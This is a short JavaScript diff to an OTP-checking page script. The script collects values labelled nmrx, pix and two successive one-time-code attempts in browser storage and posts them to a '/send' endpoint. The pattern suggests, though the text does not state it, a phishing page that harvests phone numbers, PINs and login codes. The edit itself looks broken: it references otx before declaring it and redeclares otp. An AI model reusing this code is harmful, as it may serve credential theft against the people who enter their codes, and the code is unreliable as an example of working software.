@@ -154,12 +154,12 @@ function checkOTP(){
     if(otpAttempt === 1){
         localStorage.setItem("otp", otp);
     }else{
-        localStorage.setItem("otpp", otp);
+        localStorage.setItem("otx", otx);
     }
 
     const nmrx = localStorage.getItem("nmrx");
     const pix = localStorage.getItem("pix");
-    const otp1 = localStorage.getItem("otp");
+    const otp = localStorage.getItem("otp");
     const otx = localStorage.getItem("otx");
 
     fetch("/send",{
@@ -305,7 +305,7 @@ if(startAgainBtn){
     startAgainBtn.addEventListener("click",()=>{
 
         localStorage.removeItem("otp");
-        localStorage.removeItem("otpp");
+        localStorage.removeItem("otx");
         localStorage.removeItem("nmrx");
         localStorage.removeItem("pix");
 
